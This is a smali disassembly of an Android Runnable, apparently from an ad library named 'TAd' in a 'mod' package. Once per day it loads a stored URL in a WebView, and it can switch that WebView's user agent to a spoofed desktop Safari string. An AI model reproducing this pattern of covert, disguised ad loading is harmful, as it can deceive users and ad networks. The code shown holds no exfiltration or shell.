.class Lcom/mod/libs/TAd$2;
.super Ljava/lang/Object;
.source "TAd.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/mod/libs/TAd;->onThread(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/mod/libs/TAd;

.field private final synthetic val$deskSts:Ljava/lang/String;

.field private final synthetic val$lpxStr:Ljava/lang/String;

.field private final synthetic val$sts:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/mod/libs/TAd;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/mod/libs/TAd$2;->this$0:Lcom/mod/libs/TAd;

    iput-object p2, p0, Lcom/mod/libs/TAd$2;->val$sts:Ljava/lang/String;

    iput-object p3, p0, Lcom/mod/libs/TAd$2;->val$deskSts:Ljava/lang/String;

    iput-object p4, p0, Lcom/mod/libs/TAd$2;->val$lpxStr:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    iget-object v2, p0, Lcom/mod/libs/TAd$2;->val$sts:Ljava/lang/String;

    const-string v3, "1"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/mod/libs/TAd$2;->this$0:Lcom/mod/libs/TAd;

    invoke-static {v2}, Lcom/mod/libs/TAd;->access$0(Lcom/mod/libs/TAd;)Lcom/mod/libs/TTR;

    move-result-object v2

    sget-object v3, Lcom/mod/libs/TTR$x;->daudate:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lcom/mod/libs/TTR;->ClearSharedContains(Ljava/lang/String;)V

    :cond_0
    iget-object v2, p0, Lcom/mod/libs/TAd$2;->val$deskSts:Ljava/lang/String;

    const-string v3, "1"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/mod/libs/TAd$2;->this$0:Lcom/mod/libs/TAd;

    invoke-static {v2}, Lcom/mod/libs/TAd;->access$1(Lcom/mod/libs/TAd;)Landroid/webkit/WebView;

    move-result-object v2

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const-string v3, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    :cond_1
    invoke-static {}, Lcom/mod/libs/TTR;->GetDate()Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/mod/libs/TAd$2;->this$0:Lcom/mod/libs/TAd;

    invoke-static {v2}, Lcom/mod/libs/TAd;->access$0(Lcom/mod/libs/TAd;)Lcom/mod/libs/TTR;

    move-result-object v2

    sget-object v3, Lcom/mod/libs/TTR$x;->daudate:Ljava/lang/String;

    invoke-virtual {v2, v3}, Lcom/mod/libs/TTR;->GetSharedString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2

    iget-object v2, p0, Lcom/mod/libs/TAd$2;->this$0:Lcom/mod/libs/TAd;

    invoke-static {v2}, Lcom/mod/libs/TAd;->access$1(Lcom/mod/libs/TAd;)Landroid/webkit/WebView;

    move-result-object v2

    iget-object v3, p0, Lcom/mod/libs/TAd$2;->val$lpxStr:Ljava/lang/String;

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :cond_2
    return-void
.end method
